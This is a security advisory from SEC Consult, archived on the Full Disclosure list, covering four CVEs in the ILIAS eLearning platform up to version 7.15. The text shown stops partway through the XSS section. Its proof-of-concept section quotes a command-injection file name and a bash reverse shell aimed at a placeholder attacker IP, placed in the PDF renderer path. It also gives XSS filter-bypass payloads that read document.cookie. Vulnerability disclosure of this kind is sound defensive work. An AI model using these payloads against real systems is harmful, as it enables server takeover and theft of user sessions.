---
title: SEC Consult SA-20221206-0 :: Multiple critical vulnerabilities in ILIAS eLearning platform
url: https://seclists.org/fulldisclosure/2022/Dec/7
source: Full Disclosure
date: 2022-12-10
fetch_date: 2025-10-04T01:09:01.586450
---

# SEC Consult SA-20221206-0 :: Multiple critical vulnerabilities in ILIAS eLearning platform

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20221206-0 :: Multiple critical vulnerabilities in ILIAS eLearning platform

---

*From*: "SEC Consult Vulnerability Lab, Research via Fulldisclosure" <fulldisclosure () seclists org>
*Date*: Tue, 6 Dec 2022 07:47:13 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20221206-0 >
=======================================================================
               title: Multiple critical vulnerabilities
             product: ILIAS eLearning platform
  vulnerable version: <= 7.15
       fixed version: 7.16
          CVE number: CVE-2022-45915, CVE-2022-45916, CVE-2022-45917,
                      CVE-2022-45918
              impact: critical
            homepage: https://www.ilias.de
               found: 2022-09-30
                  by: Anna Hartig (Office Bochum)
                      Constantin Schwarz (Office Bochum)
                      Niklas Schilling (Office Munich)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Atos company
                      Europe | Asia | North America

                      https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"Around since 1998, ILIAS is a powerful learning management system that fulfills
all your requirements. Using its integrated tools, small and large businesses,
universities, schools and public authorities are able to create tailored,
individual learning scenarios."

Source: https://www.ilias.de/en/

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Authenticated Direct OS Command Injection - CVE-2022-45915
ILIAS utilizes several third-party programs to perform tasks like creating PDF
files or scanning uploaded files for known viruses. These are called using the
PHP exec() function. In several instances, the arguments passed to the exec()
function contain user input that is not properly sanitized.
By performing malicious configuration steps or uploading dangerous files, an
attacker can execute arbitrary system commands with the rights of the web server
user (www-data).
The privilege required for the different instances of command injection range
from low rights to admin rights.

2) Stored Cross-Site Scripting - CVE-2022-45916
Multiple stored cross-site scripting vulnerabilities were identified in ILIAS
course items. These were either achieved by bypassing existing XSS filters or
simply by exploiting missing input validation altogether. This results in the
execution of attacker-controlled JavaScript code by the user's browser.
The attacker requires the right to create course items, e.g., as a tutor of a
course.

3) Local File Inclusion - CVE-2022-45918
The included SCORM editor features a debugger that gives authors insights into
the current SCORM player session, as well as previous sessions. When accessing
the logs of previous sessions, the debugger fails to validate the requested
file path, allowing for arbitrary filesystem access.

4) Open Redirect - CVE-2022-45917
The function shib_logout.php redirects the user to a URL specified in the
"return" parameter. Since this parameter is not validated, an attacker can use
it to redirect a victim to an arbitrary website. This is a powerful tool in
phishing campaigns, as it allows hiding the malicious webpage behind a link that
looks like it would take you to the real ILIAS webpage.

Proof of concept:
-----------------
1) Authenticated Direct OS Command Injection - CVE-2022-45915
Multiple instances of command injection vulnerabilities were identified:

a) ZIP archive upload
Normal users with open assessments can submit their solution by uploading a ZIP
archive. These archives are extracted on the server and scanned for viruses
recursively. The directory and file names can be used by an attacker to inject
system commands, e.g., by including a directory with the name
$(touch /tmp/pwned) to the ZIP archive. Exploiting this vulnerability, an attacker
is able to get a reverse shell on the ILIAS webserver with the rights of the
web server user (www-data).

b) Media object creation
ILIAS can be configured so that users can create media objects based on files
inside an "Upload Directory". Before these objects are created, the files are
scanned for viruses. The file names can be used by an attacker to inject system
commands. By placing a file with a name like $(touch /tmp/pwned) inside the
upload directory and then creating a media object based on it, an attacker is
able to execute arbitrary system commands with the rights of www-data on the
server.

c) PDF document creation
ILIAS provides users the functionality to export content as PDF files. A user
with admin rights can configure the path to the preferred PDF renderer. An
attacker can use this parameter to inject system commands. Due to missing
input validation it is possible to inject multiple commands. The path to
wkhtmltopdf has to be included in the payload, as ILIAS checks for it. By
changing the path to:

/usr/local/bin/wkhtmltopdf; bash -c "bash -i >& /dev/tcp/<IP_Address_Attacker>/13373 0>&1";

an attacker can open a reverse shell with the rights of www-data that connects
to the attacker's machine on port 13373. The reverse shell is initiated when
the export function is triggered.
No PDF renderer has to be installed for this vulnerability to be exploitable.

2) Stored Cross-Site Scripting - CVE-2022-45916
Multiple instances of stored cross-site scripting were identified:

a) Several Stored XSS Attacks in Tests
An attacker must be able to create new tests in which the JavaScript code will
be embedded. If a victim then later accesses one of those tests, the XSS payload will
be triggered. The "Question" input field of a test has a filter in place, which
correctly removes HTML tags such as <script> or
<img src="x" onerror="alert(document.cookie)">. By making use of half open HTML
tags, this filter can be successfully bypassed. E.g.

<img src="x" onerror="alert(document.cookie)"

This half open HTML tag can also be used in the "Introductory Message" of a test
to trigger an XSS. It's important to end the JavaScript code with a quotation
mark or space, to properly separate it from successive HTML tags, after it's
embedded into a test.

Finally, the "Question" input field of the question type "Long Menu" was
identified to use no filtering at all, resulting in the unrestricted use of
arbitrary HTML tags such as <script>.

b) Stored XSS in title of course items
An attacker with rights to create an arbitrary course item can conduct a stored
XSS attack by setting the title of the element to:

" onclick="alert(document.cookie)"

When a user clicks on the button to the right of the title, the XSS payload is
triggered.

c) Stored XSS in HTML sites
An attacker with rights to edit an HTML Learning Module can conduct a stored
XSS attack, as it is allowed to insert JavaS...